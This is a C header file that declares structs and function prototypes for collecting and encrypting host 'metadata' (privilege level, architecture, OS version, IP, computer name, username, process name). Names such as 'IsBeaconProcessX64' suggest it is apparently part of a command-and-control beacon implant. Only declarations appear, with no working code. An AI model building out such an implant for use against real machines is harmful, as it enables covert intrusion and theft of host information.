#pragma once
#include <stdio.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#pragma warning(disable:4996) 

typedef struct {
    uint8_t* MakeMeta;
    size_t MakeMetaLen;
} MakeMetaInfoResult;

typedef struct {
    unsigned char* EncryptMetaData;
    DWORD EncryptMetaDataLen;
} EncryptMetadataResult;

MakeMetaInfoResult MakeMetaInfo();
EncryptMetadataResult EncryMetadata();
BOOL IsHighPriv();
BOOL IsOSX64();
BOOL IsBeaconProcessX64();
uint32_t  GetMetaDataFlag();
unsigned char* GetOSVersion();
uint32_t GetLocalIPInt();
unsigned char* GetComputerNameAsString();
unsigned char* GetUsername();
unsigned char* GetProcessName();
unsigned char* GetCodePageANSI(size_t* bytesWritten);
unsigned char* GetCodePageOEM(size_t* bytesWritten);
uint8_t* GetMagicHead(uint8_t* MagicHead);